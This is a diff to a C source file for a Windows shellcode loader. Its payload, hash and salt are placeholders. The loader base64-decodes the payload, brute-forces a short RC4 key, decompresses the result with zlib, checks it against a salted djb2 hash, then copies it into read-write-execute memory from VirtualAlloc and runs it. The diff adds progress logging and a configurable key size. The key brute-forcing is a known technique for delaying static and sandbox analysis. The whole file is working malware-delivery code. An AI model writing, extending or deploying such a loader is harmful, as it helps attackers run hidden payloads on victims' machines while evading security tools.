@@ -1,11 +1,13 @@
 #include <windows.h>
 #include <string.h>
 #include <zlib.h>
+#include <stdio.h>
 
 // Encrypted shellcode
 unsigned char encrypted_shellcode[] = "ENCRYPTED_SHELLCODE_PLACEHOLDER";
 unsigned char expected_hash[] = "EXPECTED_HASH_PLACEHOLDER";
 unsigned char salt[] = "SALT_PLACEHOLDER";
+#define KEY_SIZE KEY_SIZE_PLACEHOLDER
 
 // Base64 decode table
 static const unsigned char b64_table[256] = {
@@ -29,6 +31,7 @@ static const unsigned char b64_table[256] = {
 
 // Base64 decode function
 int base64_decode(const unsigned char *src, int src_len, unsigned char *dst) {
+    printf("[~] Starting base64 decode\n");
     int i, j = 0;
     unsigned char a, b, c, d;
     
@@ -42,18 +45,22 @@ int base64_decode(const unsigned char *src, int src_len, unsigned char *dst) {
         if (c != 64) dst[j++] = (b << 4) | (c >> 2);
         if (d != 64) dst[j++] = (c << 6) | d;
     }
+    printf("[+] Base64 decode completed: %d bytes\n", j);
     return j;
 }
 
 // Zlib decompressor using uncompress()
 int zlib_decompress(const unsigned char *src, int src_len, unsigned char *dst, int dst_max) {
+    printf("[~] Starting zlib decompression\n");
     uLongf dest_len = (uLongf)dst_max;
     int ret = uncompress(dst, &dest_len, src, (uLong)src_len);
     
     if (ret != Z_OK) {
+        printf("[x] Zlib decompression failed: error %d\n", ret);
         return 0;
     }
     
+    printf("[+] Zlib decompression completed: %d bytes\n", (int)dest_len);
     return (int)dest_len;
 }
 
@@ -119,21 +126,25 @@ unsigned int bytes_to_uint(const unsigned char *bytes) {
 }
 
 // Recursive bruteforce to find RC4 key
-int bruteforce_key(unsigned char *key, int pos, int max_len, int b64_len, unsigned char *final_shellcode, int *final_len) {
+int bruteforce_key(unsigned char *key, int pos, int max_len, unsigned char *b64_decoded, int decoded_len, unsigned char *final_shellcode, int *final_len) {
     int i;
     rc4_state_t rc4_state;
     unsigned int calculated_hash;
     unsigned int target_hash = bytes_to_uint(expected_hash);
     
     if (pos == max_len) {
-        unsigned char b64_decoded[8192];
         unsigned char rc4_decrypted[8192];
         unsigned char decompressed[8192];
         
-        // Decode base64
-        int decoded_len = base64_decode(encrypted_shellcode, b64_len, b64_decoded);
-        
         // Decrypt with RC4
+        if (KEY_SIZE == 1) {
+            printf("[~] Testing RC4 key: %02x\n", key[0]);
+        } else if (KEY_SIZE == 2) {
+            printf("[~] Testing RC4 key: %02x%02x\n", key[0], key[1]);
+        } else {
+            printf("[~] Testing RC4 key: %02x%02x%02x\n", key[0], key[1], key[2]);
+        }
+        
         memcpy(rc4_decrypted, b64_decoded, decoded_len);
         rc4_init(&rc4_state, key, max_len);
         rc4_decrypt(&rc4_state, rc4_decrypted, decoded_len);
@@ -143,6 +154,7 @@ int bruteforce_key(unsigned char *key, int pos, int max_len, int b64_len, unsign
         
         if (decompressed_len > 0) {
             // Create buffer for hash validation
+            printf("[~] Validating hash\n");
             unsigned char hash_input[8192];
             memcpy(hash_input, decompressed, decompressed_len);
             int salt_len = sizeof(salt) - 1;
@@ -152,6 +164,13 @@ int bruteforce_key(unsigned char *key, int pos, int max_len, int b64_len, unsign
             calculated_hash = djb2_hash(hash_input, decompressed_len + salt_len);
             
             if (calculated_hash == target_hash) {
+                if (KEY_SIZE == 1) {
+                    printf("[+] Valid key found: %02x\n", key[0]);
+                } else if (KEY_SIZE == 2) {
+                    printf("[+] Valid key found: %02x%02x\n", key[0], key[1]);
+                } else {
+                    printf("[+] Valid key found: %02x%02x%02x\n", key[0], key[1], key[2]);
+                }
                 memcpy(final_shellcode, decompressed, decompressed_len);
                 *final_len = decompressed_len;
                 return 1;
@@ -163,7 +182,7 @@ int bruteforce_key(unsigned char *key, int pos, int max_len, int b64_len, unsign
     // Try all possible byte values
     for (i = 1; i <= 255; i++) {
         key[pos] = (unsigned char)i;
-        if (bruteforce_key(key, pos + 1, max_len, b64_len, final_shellcode, final_len)) {
+        if (bruteforce_key(key, pos + 1, max_len, b64_decoded, decoded_len, final_shellcode, final_len)) {
             return 1;
         }
     }
@@ -172,26 +191,52 @@ int bruteforce_key(unsigned char *key, int pos, int max_len, int b64_len, unsign
 }
 
 int main() {
-    unsigned char key[3];
+    printf("[~] Starting payload execution\n");
+    unsigned char key[KEY_SIZE];
     unsigned char final_shellcode[8192];
+    unsigned char b64_decoded[8192];
     int b64_len = sizeof(encrypted_shellcode) - 1;
     int final_len = 0;
     int found = 0;
     
-    // Bruteforce RC4 key
+    printf("[~] RC4 key size: %d bytes\n", KEY_SIZE);
+    printf("[~] Base64 payload size: %d bytes\n", b64_len);
+    
+    // Decode base64 ONCE at the beginning
+    printf("[~] Decoding base64 payload\n");
+    int decoded_len = base64_decode(encrypted_shellcode, b64_len, b64_decoded);
+    if (decoded_len <= 0) {
+        printf("[x] Base64 decode failed\n");
+        return 1;
+    }
+    printf("[+] Base64 decoded: %d bytes\n", decoded_len);
+    
+    printf("[~] Starting RC4 key bruteforce\n");
+    
+    // Bruteforce RC4 key with pre-decoded data
     memset(key, 0, sizeof(key));
-    if (bruteforce_key(key, 0, 3, b64_len, final_shellcode, &final_len)) {
+    if (bruteforce_key(key, 0, KEY_SIZE, b64_decoded, decoded_len, final_shellcode, &final_len)) {
         found = 1;
     }
     
     if (found && final_len > 0) {
+        printf("[+] Payload decrypted successfully: %d bytes\n", final_len);
+        printf("[~] Allocating executable memory\n");
+        
         // Inject and execute shellcode
         void *execs = VirtualAlloc(0, final_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
         if (execs) {
+            printf("[+] Memory allocated at: %p\n", execs);
+            printf("[~] Copying shellcode to memory\n");
             memcpy(execs, final_shellcode, final_len);
+            printf("[~] Executing shellcode\n");
             ((void(*)())(execs))();
+        } else {
+            printf("[x] Memory allocation failed\n");
         }
+    } else {
+        printf("[x] Failed to decrypt payload\n");
     }
-
+    
     return 0;
 }
